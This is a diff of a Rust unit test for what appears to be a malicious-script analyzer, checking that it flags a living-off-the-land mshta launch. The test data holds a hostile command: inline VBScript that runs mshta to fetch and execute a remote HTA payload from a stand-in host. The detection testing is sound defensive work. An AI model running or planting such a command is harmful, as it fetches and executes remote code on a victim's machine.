@@ -9890,7 +9890,8 @@ mod misc_handler_tests {
 
     #[test]
     fn mshta_inline_vbscript_shell_run_url_is_scanned() {
-        let script = br#"mshta vbscript:CreateObject("Wscript.Shell").Run("mshta http://mshta-inline-vbs.example/payload.hta")"#;
+        let raw = r#"mshta vbscript:CreateObject("Wscript.Shell").Run("mshta http://mshta-inline-vbs.example/payload.hta")"#;
+        let script = raw.as_bytes();
         let report = crate::analyze(script, &Config::default());
         assert!(
             report.traits.iter().any(|t| {
@@ -9901,6 +9902,14 @@ mod misc_handler_tests {
                 )
             }),
             "inline mshta VBScript URL was not scanned: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "mshta" && cmd == raw)),
+            "inline mshta VBScript payload not marked as LOLBAS: {:?}",
             report.traits
         );
     }
